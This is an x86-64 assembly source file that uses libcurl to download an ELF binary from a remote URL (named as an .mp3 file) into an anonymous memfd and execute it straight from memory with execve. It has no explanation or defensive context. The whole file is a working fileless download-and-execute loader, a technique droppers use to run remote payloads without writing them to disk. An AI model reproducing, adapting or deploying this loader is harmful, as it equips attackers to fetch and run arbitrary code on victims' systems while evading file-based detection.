; linuxthor
;
; libcurl download ELF to memfd and exec it 
;
; assemble with:
; nasm -f elf64 -o curlmem.o curlmem.asm
; gcc curlmem.o -no-pie -o curlmem -lcurl
;

BITS 64

extern curl_global_init, curl_easy_init, curl_easy_perform
extern curl_easy_setopt, curl_easy_cleanup, curl_global_cleanup
extern fdopen, setvbuf

%define CURL_GLOBAL_ALL         3
%define CURLOPT_URL             10002
%define CURLOPT_WRITEDATA       10001
%define CURLOPT_USERAGENT       10018
%define CURLOPT_FOLLOWLOCATION  52
%define _IONBF          2

global main

main: 
    push rbp
    mov rbp, rsp
    mov rdi, CURL_GLOBAL_ALL 
    xor eax, eax              
    call curl_global_init

    call curl_easy_init

    cmp  rax, 0
    je   error

    mov  [curly], rax

    mov  rax, 319                               ; memfd_create
    mov  rdi, mfd
    mov  rsi, 0
    syscall

    add [pfd+14], rax

    mov  rdi, rax
    mov  rsi, md
    xor  rax, rax
    call fdopen                                 

    mov [filea], rax

    mov  rdi, rax 
    mov  rsi, 0
    mov  rdx, _IONBF                            ; disable buffering
    mov  rcx, 0                                 ; else we get only first 4096 
    call setvbuf                                ; bytes 

    mov rdx, [filea]
    mov rdi, [curly]
    mov rsi, CURLOPT_WRITEDATA
    xor rax, rax
    call curl_easy_setopt

    cmp rax, 0
    jne error 
 
    mov rdi, [curly]
    mov rsi, CURLOPT_URL               
    mov rdx, url
    xor rax, rax
    call curl_easy_setopt

    cmp rax, 0
    jne error

    mov rdi, [curly]
    mov rsi, CURLOPT_USERAGENT
    mov rdx, ua
    xor eax, eax
    call curl_easy_setopt

    cmp rax, 0
    jne error

    mov rdi, [curly]
    mov rsi, CURLOPT_FOLLOWLOCATION
    mov rdx, 1
    xor eax, eax
    call curl_easy_setopt

    cmp rax, 0
    jne error

    mov rdi, [curly]
    xor eax, eax 
    call curl_easy_perform

    cmp rax, 0
    jne error

    mov rdi, [curly]
    xor eax, eax
    call curl_easy_cleanup

    call curl_global_cleanup

    mov rbp, rsp
    mov rax, 59                               ;  sys_execve
    mov rdi, pfd
    mov rsi, 0
    mov rdx, 0
    syscall 

    mov rsp, rbp
    pop rbp
    xor eax, eax                              ; shouldn't get here 
    ret 

error:
    mov rsp, rbp
    pop rbp
    mov rax, 1
    ret

section .data
    url db 'https://github.com/linuxthor/odds-and-ends/releases/download/0.1/linux.mp3',0 
    ua  db 'libcurl/asm',0 
    pfd db '/proc/self/fd/0',0
    mfd db 'musty',0
    md  db 'wb',0

section .bss
    curly resq 1
    filea resq 1
